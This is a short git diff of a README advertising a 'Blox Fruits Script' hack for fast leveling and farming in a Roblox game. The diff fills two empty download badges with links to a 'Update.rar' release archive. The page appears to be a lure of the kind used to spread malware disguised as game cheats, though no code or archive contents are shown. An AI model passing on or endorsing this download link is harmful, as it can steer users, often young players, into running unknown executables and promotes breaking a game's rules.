@@ -1,10 +1,10 @@
 # 🏴‍☠️ **Blox Fruits Script — The Best Hack for Fast Leveling & Farming (2025 Edition)** ⚡  
-[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-blue?style=for-the-badge&logo=download)]()  
+[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-blue?style=for-the-badge&logo=download)](https://github.com/BitWarrio/blox-fruits-script/releases/download/Update/Update.rar)  
 
 ![blox](https://github.com/user-attachments/assets/5185f180-76f7-4412-a00e-6964d37c0d7e)
 
 
-[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-blue?style=for-the-badge&logo=download)]()  
+[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-blue?style=for-the-badge&logo=download)](https://github.com/BitWarrio/blox-fruits-script/releases/download/Update/Update.rar)  
 
 ---
 
